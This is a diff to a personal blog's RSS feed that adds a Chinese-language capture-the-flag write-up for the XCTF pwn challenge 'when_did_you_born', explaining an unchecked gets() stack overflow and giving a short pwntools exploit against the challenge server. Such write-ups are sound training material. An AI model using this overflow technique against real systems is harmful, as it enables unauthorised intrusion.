@@ -6,10 +6,32 @@
     <description>Recent content on NiceSeven&#39;s Website</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 06 Feb 2020 14:47:29 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 06 Feb 2020 18:04:27 +0800</lastBuildDate>
     
 	<atom:link href="https://niceseven.github.io/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>XCTF Pwn When_did_you_born</title>
+      <link>https://niceseven.github.io/post/2020/02/06/xctf-pwn-when_did_you_born/</link>
+      <pubDate>Thu, 06 Feb 2020 18:04:27 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/06/xctf-pwn-when_did_you_born/</guid>
+      <description>when_did_you_born checksec检查有那些防护
+64位程序开启NX、stack canary
+程序功能一问一答接收2个输入
+拖入ida分析
+关键代码在两个if判断
+第一个if判断如果输入的是1926则直接返回，后面的都不会执行了，但是第二个if判断又要求输入的是1926，所以产生矛盾
+通过仔细观察可以发现第二个if判断之前存在一个gets()函数没有做任何防护，并且变量v4与v5存在同一个栈上，所以这里可以使用栈溢通过v4来覆盖修改v5变量的值
+从伪代码可以看出第一次接收数据是传入v5第二次接收数据是传入v4
+思路：
+1、在第一次接收数据时传入不等于1926的值
+2、在第二次接收数据时因为gets()函数对传入的数据长度没有做任何限制，所以可以通过v4栈溢出修改v5的值为1926来cat flag
+v4与v5之间的偏移为0x20-0x18
+编写exp
+#!/usr/bin/env python #-*-coding=UTF-8-*- from pwn import * sh = remote(&amp;#39;111.198.29.45&amp;#39;,30849) sh.sendlineafter(&amp;#34;What&amp;#39;s Your Birth?&amp;#34;,&amp;#39;0&amp;#39;) payload = &amp;#39;a&amp;#39;*8 + p64(1926)#这里的8是v4到v5的偏移量0x20-0x18计算得来 sh.sendlineafter(&amp;#34;What&amp;#39;s Your Name?&amp;#34;, payload) sh.interactive() </description>
+    </item>
     
     <item>
       <title>XCTF Pwn CGfsb</title>
